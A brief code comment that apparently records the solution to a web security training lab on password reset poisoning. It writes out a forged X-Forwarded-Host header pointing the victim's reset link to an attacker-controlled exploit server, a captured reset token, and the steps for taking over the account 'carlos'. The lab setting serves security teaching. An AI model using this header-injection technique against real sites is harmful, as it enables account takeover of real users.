/*

1) https://exploit-0a5e0014043de04c80d5e39101b0003d.exploit-server.net/exploit

2) POST /forgot-password HTTP/2
   X-Forwarded-Host: exploit-0a5e0014043de04c80d5e39101b0003d.exploit-server.net/exploit
    username=carlos


1) Enter carlos username, and submits a password reset request on their behalf. 
    When submitting the form, intercept the resulting HTTP request and modify the Host header to exploit server. 

3) GET /exploit/forgot-password?temp-forgot-password-token=oaxn84x7llfkwcoke9er6lwrhxjdzn79 

4) copy the rest link and change the token parameter and reset the password

*/